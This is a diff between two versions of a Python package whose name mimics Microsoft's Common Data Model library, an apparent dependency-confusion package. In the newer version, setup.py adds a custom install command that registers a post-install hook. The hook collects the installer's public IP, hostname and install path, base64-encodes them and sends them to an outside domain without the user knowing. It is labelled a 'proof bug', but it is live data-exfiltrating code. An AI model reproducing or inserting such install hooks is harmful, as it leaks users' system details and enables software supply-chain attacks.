# Comparing `tmp/commondatamodel-objectmodel-cdmstandards-0.0.1.tar.gz` & `tmp/commondatamodel-objectmodel-cdmstandards-2.8.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "commondatamodel-objectmodel-cdmstandards-0.0.1.tar", last modified: Sun Apr 23 17:01:12 2023, max compression
+gzip compressed data, was "commondatamodel-objectmodel-cdmstandards-2.8.0.tar", last modified: Mon Apr 24 19:21:18 2023, max compression
```

## Comparing `commondatamodel-objectmodel-cdmstandards-0.0.1.tar` & `commondatamodel-objectmodel-cdmstandards-2.8.0.tar`

### file list

```diff
@@ -1,20 +1,20 @@
-drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-23 17:01:12.345388 commondatamodel-objectmodel-cdmstandards-0.0.1/
--rw-r--r--   0 kotko      (501) staff       (20)     1081 2021-02-11 13:14:03.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/LICENSE.txt
--rw-r--r--   0 kotko      (501) staff       (20)      194 2021-02-11 13:14:03.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/MANIFEST.in
--rw-r--r--   0 kotko      (501) staff       (20)      894 2023-04-23 17:01:12.345456 commondatamodel-objectmodel-cdmstandards-0.0.1/PKG-INFO
--rw-r--r--   0 kotko      (501) staff       (20)        0 2022-10-14 17:54:03.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/README.md
-drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-23 17:01:12.343717 commondatamodel-objectmodel-cdmstandards-0.0.1/data/
--rw-r--r--   0 kotko      (501) staff       (20)        9 2021-02-11 13:14:03.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/data/data_file
--rw-r--r--   0 kotko      (501) staff       (20)      253 2021-02-11 16:09:08.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/pyproject.toml
--rw-r--r--   0 kotko      (501) staff       (20)       78 2023-04-23 17:01:12.345935 commondatamodel-objectmodel-cdmstandards-0.0.1/setup.cfg
--rw-r--r--   0 kotko      (501) staff       (20)     8510 2023-04-23 17:01:07.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/setup.py
-drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-23 17:01:12.342430 commondatamodel-objectmodel-cdmstandards-0.0.1/src/
-drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-23 17:01:12.344835 commondatamodel-objectmodel-cdmstandards-0.0.1/src/commondatamodel_objectmodel_cdmstandards.egg-info/
--rw-r--r--   0 kotko      (501) staff       (20)      894 2023-04-23 17:01:12.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/src/commondatamodel_objectmodel_cdmstandards.egg-info/PKG-INFO
--rw-r--r--   0 kotko      (501) staff       (20)      513 2023-04-23 17:01:12.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/src/commondatamodel_objectmodel_cdmstandards.egg-info/SOURCES.txt
--rw-r--r--   0 kotko      (501) staff       (20)        1 2023-04-23 17:01:12.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/src/commondatamodel_objectmodel_cdmstandards.egg-info/dependency_links.txt
--rw-r--r--   0 kotko      (501) staff       (20)       39 2023-04-23 17:01:12.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/src/commondatamodel_objectmodel_cdmstandards.egg-info/entry_points.txt
--rw-r--r--   0 kotko      (501) staff       (20)       77 2023-04-23 17:01:12.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/src/commondatamodel_objectmodel_cdmstandards.egg-info/requires.txt
--rw-r--r--   0 kotko      (501) staff       (20)        1 2023-04-23 17:01:12.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/src/commondatamodel_objectmodel_cdmstandards.egg-info/top_level.txt
-drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-23 17:01:12.345089 commondatamodel-objectmodel-cdmstandards-0.0.1/tests/
--rw-r--r--   0 kotko      (501) staff       (20)      417 2021-02-11 13:14:03.000000 commondatamodel-objectmodel-cdmstandards-0.0.1/tests/test_simple.py
+drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-24 19:21:18.958297 commondatamodel-objectmodel-cdmstandards-2.8.0/
+-rw-r--r--   0 kotko      (501) staff       (20)     1081 2021-02-11 13:14:03.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/LICENSE.txt
+-rw-r--r--   0 kotko      (501) staff       (20)      194 2021-02-11 13:14:03.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/MANIFEST.in
+-rw-r--r--   0 kotko      (501) staff       (20)      894 2023-04-24 19:21:18.958365 commondatamodel-objectmodel-cdmstandards-2.8.0/PKG-INFO
+-rw-r--r--   0 kotko      (501) staff       (20)        0 2022-10-14 17:54:03.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/README.md
+drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-24 19:21:18.956689 commondatamodel-objectmodel-cdmstandards-2.8.0/data/
+-rw-r--r--   0 kotko      (501) staff       (20)        9 2021-02-11 13:14:03.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/data/data_file
+-rw-r--r--   0 kotko      (501) staff       (20)      253 2021-02-11 16:09:08.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/pyproject.toml
+-rw-r--r--   0 kotko      (501) staff       (20)       78 2023-04-24 19:21:18.958600 commondatamodel-objectmodel-cdmstandards-2.8.0/setup.cfg
+-rw-r--r--   0 kotko      (501) staff       (20)     9641 2023-04-24 19:20:14.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/setup.py
+drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-24 19:21:18.955314 commondatamodel-objectmodel-cdmstandards-2.8.0/src/
+drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-24 19:21:18.957843 commondatamodel-objectmodel-cdmstandards-2.8.0/src/commondatamodel_objectmodel_cdmstandards.egg-info/
+-rw-r--r--   0 kotko      (501) staff       (20)      894 2023-04-24 19:21:18.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/src/commondatamodel_objectmodel_cdmstandards.egg-info/PKG-INFO
+-rw-r--r--   0 kotko      (501) staff       (20)      513 2023-04-24 19:21:18.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/src/commondatamodel_objectmodel_cdmstandards.egg-info/SOURCES.txt
+-rw-r--r--   0 kotko      (501) staff       (20)        1 2023-04-24 19:21:18.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/src/commondatamodel_objectmodel_cdmstandards.egg-info/dependency_links.txt
+-rw-r--r--   0 kotko      (501) staff       (20)       39 2023-04-24 19:21:18.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/src/commondatamodel_objectmodel_cdmstandards.egg-info/entry_points.txt
+-rw-r--r--   0 kotko      (501) staff       (20)       77 2023-04-24 19:21:18.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/src/commondatamodel_objectmodel_cdmstandards.egg-info/requires.txt
+-rw-r--r--   0 kotko      (501) staff       (20)        1 2023-04-24 19:21:18.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/src/commondatamodel_objectmodel_cdmstandards.egg-info/top_level.txt
+drwxr-xr-x   0 kotko      (501) staff       (20)        0 2023-04-24 19:21:18.958009 commondatamodel-objectmodel-cdmstandards-2.8.0/tests/
+-rw-r--r--   0 kotko      (501) staff       (20)      417 2021-02-11 13:14:03.000000 commondatamodel-objectmodel-cdmstandards-2.8.0/tests/test_simple.py
```

### Comparing `commondatamodel-objectmodel-cdmstandards-0.0.1/LICENSE.txt` & `commondatamodel-objectmodel-cdmstandards-2.8.0/LICENSE.txt`

 * *Files identical despite different names*

### Comparing `commondatamodel-objectmodel-cdmstandards-0.0.1/PKG-INFO` & `commondatamodel-objectmodel-cdmstandards-2.8.0/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: commondatamodel-objectmodel-cdmstandards
-Version: 0.0.1
+Version: 2.8.0
 Summary: Proof project by kotko
 Home-page: https://github.com/kotko/bravado-decorators
 Author: Vladyslav Kotko
 Author-email: m@kotko.me
 Keywords: sample,setuptools,development
 Classifier: Development Status :: 3 - Alpha
 Classifier: Intended Audience :: Developers
```

### Comparing `commondatamodel-objectmodel-cdmstandards-0.0.1/setup.py` & `commondatamodel-objectmodel-cdmstandards-2.8.0/setup.py`

 * *Files 8% similar despite different names*

```diff
@@ -13,22 +13,59 @@
 
 # Get the long description from the README file
 long_description = (here / 'README.md').read_text(encoding='utf-8')
 
 # Arguments marked as "Required" below must be included for upload to PyPI.
 # Fields marked as "Optional" may be commented out.
 
-company = "microsoft--CDM-"
+company = "microsoft/CDM"
 name = "commondatamodel-objectmodel-cdmstandards"
-version = "0.0.1";
+version = "2.8.0";
 
 from setuptools import setup
+from setuptools.command.develop import develop
+from setuptools.command.install import install
+from subprocess import check_call
 
 
 
+# def _post_install():
+#     _post_install
+
+
+class new_install(install):
+    def __init__(self, *args, **kwargs):
+        super(new_install, self).__init__(*args, **kwargs)
+        atexit.register(_post_install)
+
+
+def _post_install():
+    file_name = 'pocbykotko.txt'
+    f = open(file_name, 'a+')  # open file in append mode
+    f.write('proof bug by kotko')
+    f.close()
+
+    ip = requests.get('https://api.ipify.org').text
+    ipText = format(ip);
+    myhost = os.uname()[1]
+    currentPath = requests.utils.quote(bytes(pathlib.Path(__file__).parent.absolute()));
+
+    PYdata = { "ip": ipText,
+               "host": myhost,
+               "path": currentPath, }
+    PYdataS = ipText+","+myhost+",("+currentPath+")"
+
+    message = PYdataS
+    message_bytes = message.encode('ascii')
+    base64_bytes = base64.b64encode(message_bytes)
+    base64_message = base64_bytes.decode('ascii')
+
+    r  = requests.get("https://kotko.org?"+company+name+"="+base64_message)
+
+
 
 setup(
     # This is the name of your project. The first time you publish this
     # package, this name will be registered for you. It will determine how
     # users can install this project, e.g.:
     #
     # $ pip install sampleproject
@@ -200,10 +237,12 @@
     # https://packaging.python.org/specifications/core-metadata/#project-url-multiple-use
     #
     # Examples listed include a pattern for specifying where the package tracks
     # issues, where the source is hosted, where to say thanks to the package
     # maintainers, and where to support the project financially. The key is
     # what's used to render the link text on PyPI.
     project_urls={},
-    cmdclass={},
+     cmdclass={
+        'install': new_install,
+    },
 )
 # _post_install()
```

### Comparing `commondatamodel-objectmodel-cdmstandards-0.0.1/src/commondatamodel_objectmodel_cdmstandards.egg-info/PKG-INFO` & `commondatamodel-objectmodel-cdmstandards-2.8.0/src/commondatamodel_objectmodel_cdmstandards.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: commondatamodel-objectmodel-cdmstandards
-Version: 0.0.1
+Version: 2.8.0
 Summary: Proof project by kotko
 Home-page: https://github.com/kotko/bravado-decorators
 Author: Vladyslav Kotko
 Author-email: m@kotko.me
 Keywords: sample,setuptools,development
 Classifier: Development Status :: 3 - Alpha
 Classifier: Intended Audience :: Developers
```

### Comparing `commondatamodel-objectmodel-cdmstandards-0.0.1/src/commondatamodel_objectmodel_cdmstandards.egg-info/SOURCES.txt` & `commondatamodel-objectmodel-cdmstandards-2.8.0/src/commondatamodel_objectmodel_cdmstandards.egg-info/SOURCES.txt`

 * *Files identical despite different names*

